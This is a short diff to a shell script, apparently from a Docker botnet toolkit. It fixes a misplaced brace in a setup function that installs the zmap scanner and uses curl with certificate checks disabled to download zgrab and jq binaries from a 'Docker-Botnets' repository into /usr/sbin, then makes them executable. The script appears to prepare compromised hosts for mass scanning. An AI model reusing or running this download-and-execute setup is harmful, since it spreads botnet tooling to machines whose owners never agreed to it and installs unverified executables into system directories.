@@ -40,15 +40,13 @@ make install
 function SETUP_ZMAP(){
 apk update
 apk add zmap
-}
-
-    # Download and install zgrab and jq
-    for file in zgrab jq; do
-        if ! [ -f "/usr/sbin/$file" ]; then
+# Download and install zgrab and jq
+for file in zgrab jq; do
+    if ! [ -f "/usr/sbin/$file" ]; then
             curl -sLk -o /usr/sbin/$file "https://github.com/Caprico1/Docker-Botnets/raw/014b5432a9403b896a3924b8704403e9ab284a68/TDGGinit/$file"
             chmod +x /usr/sbin/$file
-        fi
-    done
+    fi
+done
 }
 
 function GABBING_DATA(){
